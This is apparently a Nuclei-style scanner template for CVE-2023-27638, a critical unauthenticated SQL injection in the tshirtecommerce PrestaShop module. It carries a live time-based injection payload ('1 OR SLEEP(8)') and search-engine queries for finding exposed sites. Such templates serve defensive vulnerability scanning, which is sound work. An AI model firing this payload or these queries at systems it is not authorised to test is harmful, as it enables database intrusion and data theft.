id: CVE-2023-27638

info:
  name: tshirtecommerce PrestaShop Module - SQL Injection
  author: ritikchaddha
  severity: critical
  description: |
    The tshirtecommerce module for PrestaShop is vulnerable to unauthenticated SQL injection via the tshirtecommerce_design_cart_id parameter, allowing attackers to execute arbitrary SQL queries and extract sensitive information from the database. This is due to lack of input sanitization, as shown in the patch where pSQL() is now used.
  remediation: |
    Update the tshirtecommerce module to the latest version and apply all security patches.
  reference:
    - https://security.friendsofpresta.org/module/2023/03/21/tshirtecommerce_cwe-89.html
    - https://nvd.nist.gov/vuln/detail/CVE-2023-27638
    - https://codecanyon.net/item/prestashop-custom-product-designer/19202018
    - https://tshirtecommerce.com/
    - https://github.com/ARPSyndicate/cve-scores
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cve-id: CVE-2023-27638
    cwe-id: CWE-89
    epss-score: 0.4973
    epss-percentile: 0.97688
    cpe: cpe:2.3:a:tshirtecommerce:custom_product_designer:2.1.4:*:*:*:*:prestashop:*:*
  metadata:
    max-request: 1
    vendor: tshirtecommerce
    product: custom_product_designer
    framework: prestashop
    fofa-query: body="prestashop" && body="tshirtecommerce"
    google-query: inurl:"/tshirtecommerce/"
    runzero-match: service["http.body"] matches "(?i)Prestashop"
  tags: cve,cve2023,prestashop,tshirtecommerce,sqli,kev
flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    host-redirects: true
    matchers:
      - type: dsl
        dsl:
          - "contains_all(tolower(body), 'prestashop', 'tshirtecommerce')"
          - "status_code == 200"
        condition: and
        internal: true

  - raw:
      - |
        @timeout: 30s
        GET /module/tshirtecommerce/designer?tshirtecommerce_design_cart_id=1%20OR%20SLEEP(8) HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "duration>=8"
          - "status_code == 200"
        condition: and

